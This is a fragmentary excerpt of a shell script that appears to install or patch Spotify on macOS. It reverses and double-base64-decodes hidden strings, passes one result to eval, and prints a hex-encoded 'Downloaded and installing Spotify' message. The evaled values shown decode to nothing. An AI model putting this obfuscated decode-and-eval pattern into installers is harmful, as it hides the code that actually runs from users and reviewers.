...
buildVer="1.2.81.264.gb4ad4efa-1852"
...
macos_prepare() {
  ...
  grab1=$(echo "wgGSkVXTzEWdsdkYm50VZRXOTVWbsdEZ2J0MjZ3ZykFbS5GTqJESkhXNDFmeGdEZ6lTeMZTTINGMShUY" | rev | base64 --decode | base64 --decode)
  grab2=$(echo "=" | rev | base64 --decode | base64 --decode)
...
macos_client_install() {
  ...
  mc02=$(echo "=" | rev | base64 --decode | base64 --decode)
  #eval "${mc01}"; eval "${mc02}"
  eval "${mc02}"
  printf "\xE2\x9C\x94\x20\x44\x6F\x77\x6E\x6C\x6F\x61\x64\x65\x64\x20\x61\x6E\x64\x20\x69\x6E\x73\x74\x61\x6C\x6C\x69\x6E\x67\x20\x53\x70\x6F\x74\x69\x66\x79\n"
